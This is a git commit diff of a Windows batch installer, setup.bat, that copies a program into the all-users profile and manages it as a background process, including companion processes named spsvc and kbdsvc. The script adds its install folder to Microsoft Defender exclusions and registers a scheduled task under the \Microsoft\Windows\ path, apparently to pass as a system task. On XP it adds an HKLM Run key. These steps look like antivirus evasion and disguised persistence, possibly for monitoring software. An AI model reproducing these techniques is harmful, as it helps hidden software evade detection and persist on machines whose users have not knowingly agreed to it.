bb17ca0c5e93aff532a6168701b53e7389678c78
Dmitriy Vorotilin <dvor85@gmail.com>
2019-02-08 16:28:36 +0400

    Модифицирован скрипт устаноки

--- setup.bat
+++ setup.bat
@@ -1,7 +1,6 @@
 @echo off
 endlocal& setlocal EnableDelayedExpansion
 
-set self_dir=%~dp0
 reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL && set OS=x86|| set OS=x64
 ver | find /i "5." > nul && set XP=1|| set XP=0
 
@@ -18,59 +17,54 @@ rem Parse passed arguments to script
 :end_parse_passed_params
 
 :begin
-    if "%Progra%"==""          goto:end  
-    if "%Action%"=="install"   call:install "%Progra%"
-    if "%Action%"=="uninstall" call:uninstall "%Progra%"
-    if "%Action%"=="stop"      call:stop "%Progra%"
-    if "%Action%"=="run"       call:run "%Progra%"
-	if "%Action%"=="status"    call:status "%Progra%"
+	if "%Progra%"==""          goto:end
+
+	set name=%Progra%
+	set src=%~dp0
+	set dst=%ALLUSERSPROFILE%\%name%
+
+    if "%Action%"=="install"   call:install
+    if "%Action%"=="uninstall" call:uninstall
+    if "%Action%"=="stop"      call:stop
+    if "%Action%"=="run"       call:run
+	if "%Action%"=="status"    call:status
     goto:end
-	
+
 :install
-    if "%~1"=="" exit /b 1
-	set name=%~1
-    set dst=%ALLUSERSPROFILE%\%name%
- 
-    call:createtask %name%
-	call:exclude_from_defender %name%
+	call:exclude_from_defender
+
+	xcopy /E /C /H /R /Y /I "%src%\." "%dst%"
+	del /F /Q "%dst%\%~nx0"
+    call:createtask
     exit /b
-    
+
 :uninstall
-    if "%~1"=="" exit /b 1
-	set name=%~1
-    set dst=%ALLUSERSPROFILE%\%name%
     set task_root=\Microsoft\Windows\%name%
-    
-    call:stop %name% 
-    
+
+    call:stop
+
     if "%XP%"=="1" (
         schtasks /DELETE /TN "%name%"
     )
-    
+
     schtasks /DELETE /F /TN "%task_root%\%name%"
     reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "%name%" /f
     rmdir /Q /S "%dst%"
     exit /b
-    
+
 :stop
-    if "%~1"=="" exit /b 1
-	set name=%~1
-    set dst=%ALLUSERSPROFILE%\%name%
     set task_root=\Microsoft\Windows\%name%
     set kbdsvc=kbdsvc
-    
+
     schtasks /END /TN "%name%"
     schtasks /END /TN "%task_root%\%name%"
-    taskkill /F /IM "%name%.exe" 
-	if %name%=="spsvc" (
+    taskkill /F /IM "%name%.exe"
+	if "%name%"=="spsvc" (
 		taskkill /F /IM "%kbdsvc%.exe"
-	)	
+	)
     exit /b
-    
+
 :run
-    if "%~1"=="" exit /b 1
-	set name=%~1
-    set dst=%ALLUSERSPROFILE%\%name%
     set task_root=\Microsoft\Windows\%name%
     if "%XP%"=="1" (
 		start /B /I cmd /C "%dst%\%name%.exe"
@@ -78,34 +72,28 @@ rem Parse passed arguments to script
 	)
     schtasks /RUN /TN "%task_root%\%name%"
     exit /b
-	
+
 :status
-	if "%~1"=="" exit /b 1
-	set name=%~1
-    set dst=%ALLUSERSPROFILE%\%name%
 	set task_root=\Microsoft\Windows\%name%
 	set kbdsvc=kbdsvc
 	schtasks /QUERY /V /FO LIST /TN "%task_root%\%name%"
 	tasklist /fi "imagename eq %name%.exe"
-	if %name%=="spsvc" (
+	if "%name%"=="spsvc" (
 		tasklist /fi "imagename eq %kbdsvc%.exe"
 	)
-	
-	
+	exit /b
+
 :createtask
-	if "%~1"=="" exit /b 1
-	set name=%~1
-	set dst=%ALLUSERSPROFILE%\%name%
-	set xml="%dst%\task.xml"
+	set xml="%src%\task.xml"
 	set task_root=\Microsoft\Windows\%name%
-	
+
     if "%XP%"=="1" (
 		reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "%name%" /d "%dst%\%name%.exe" /f>nul
         rem schtasks /DELETE /TN "%name%"
-        rem schtasks /Create /RU System /SC ONLOGON /TN "%name%" /TR "%dst%\%name%.exe"        
+        rem schtasks /Create /RU System /SC ONLOGON /TN "%name%" /TR "%dst%\%name%.exe"
         exit /b
-    )    
-	
+    )
+
 	echo ^<?xml version="1.0" encoding="UTF-16"?^>^
 		^<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>^
 		^<Triggers^>^
@@ -148,20 +136,17 @@ rem Parse passed arguments to script
 		^</Exec^>^
 		^</Actions^>^
 		^</Task^> > %xml%
-	
+
 	schtasks /Create /F /XML %xml% /TN "%task_root%\%name%"
 	del /F /Q %xml%
-	
+
 	exit /b
-	
+
 :exclude_from_defender
-	if "%~1"=="" exit /b 1
-	set name=%~1
-	set dst=%ALLUSERSPROFILE%\%name%
 	powershell -ExecutionPolicy RemoteSigned -NoLogo -Noninteractive -Command "try { Add-MpPreference -ExclusionPath "%dst%"; exit 100; } catch { exit 0; }">nul 2>&1
-	
+
 	exit /b
-	
+
 :end
     exit 0
 
